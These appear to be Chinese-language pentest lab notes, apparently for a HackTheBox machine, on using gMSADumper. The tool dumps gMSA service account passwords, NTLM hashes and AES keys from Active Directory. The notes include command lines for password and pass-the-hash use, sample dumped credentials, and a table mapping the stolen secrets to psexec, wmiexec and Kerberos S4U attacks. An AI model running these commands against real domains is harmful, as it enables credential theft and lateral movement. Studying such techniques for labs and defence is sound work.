# gMSADumper

## 介绍

gMSADumper是用“有读取权限的普通域用户”，把gMSA服务账号的密码直接导出来。

拖出来是：

（1）明文密码（Base64）

（2）NTLM Hash

（3）AES Key（Kerberos）

本质：域内“合法读取”，不是漏洞利用

## 使用gMSADumper前提

（1）你的用户/你的组

拥有对整个gMSA的权限

（1）ReadGMSAPassword

（2）或BloodHound看到：

User->Group->gMSA

## 利用

### 1）用账号密码跑

python3 gMSADumper.py -u JDgodd -p '123' -d intelligence.htb -l DCIP

### 2）用NTLM Hash（Pass-The-Hash）

python3 gMSADumper.py -u JDgodd -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 -d intelligence.htb -l DCIP

## 输出

示例输出：

```
[+] Account: SVC_BACKUP$
    NTLM: 8a3b2f3e8d6e...
    AES128: 5c1d...
    AES256: 1e9a...
    Password: Jv0eS3rviCe@2024
```

| 拿到的东西 | 用来干嘛           |
| ---------- | ------------------ |
| NTLM       | psexec/wmiexec/smb |
| AES256     | Kerberos/S4U/getST |
| 明文密码   |                    |

